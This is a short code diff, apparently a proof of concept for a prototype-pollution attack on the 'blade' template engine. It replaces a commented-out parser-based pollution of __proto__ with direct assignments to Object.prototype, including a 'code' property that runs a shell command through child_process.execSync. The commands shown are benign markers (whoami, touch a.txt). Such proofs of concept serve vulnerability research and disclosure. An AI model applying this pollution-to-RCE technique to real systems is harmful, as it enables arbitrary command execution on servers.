@@ -1,14 +1,7 @@
 const blade = require('blade');
-// const { parse } = require('ion-parser')
-// const config = parse(`
-// test = 'Hey universe'
-
-// [__proto__.someprop]
-// name = "somename"
-// value = "somevalue"
-// code = "process.mainModule.require('child_process').execSync(\`whoami\`)"
-// `)
-// console.log(config)
+Object.prototype.name = "somename"
+Object.prototype.value = "somevalue"
+Object.prototype.code = "process.mainModule.require('child_process').execSync(\`touch a.txt\`)"
 
 const template = `html
     head
